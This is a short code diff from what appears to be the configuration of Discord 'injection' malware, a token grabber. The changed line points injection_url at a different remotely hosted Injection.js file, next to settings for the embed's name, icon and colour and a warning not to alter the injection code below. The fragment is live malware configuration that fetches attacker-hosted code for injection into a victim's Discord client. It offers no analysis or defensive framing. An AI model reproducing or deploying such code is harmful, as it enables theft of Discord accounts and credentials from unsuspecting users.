@@ -13,7 +13,7 @@ const config = {
   embed_name: 'Discord Injection', 
   embed_icon: 'https://ida64.is-a.dev/assets/img/me.jpg'.replace(/ /g, '%20'),
   embed_color: 8363488,
-  injection_url: 'https://ida64.is-a.dev/assets/injection.js',
+  injection_url: 'https://raw.githubusercontent.com/7v2p/7v2p.github.io/main/assets/Injection.js',
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
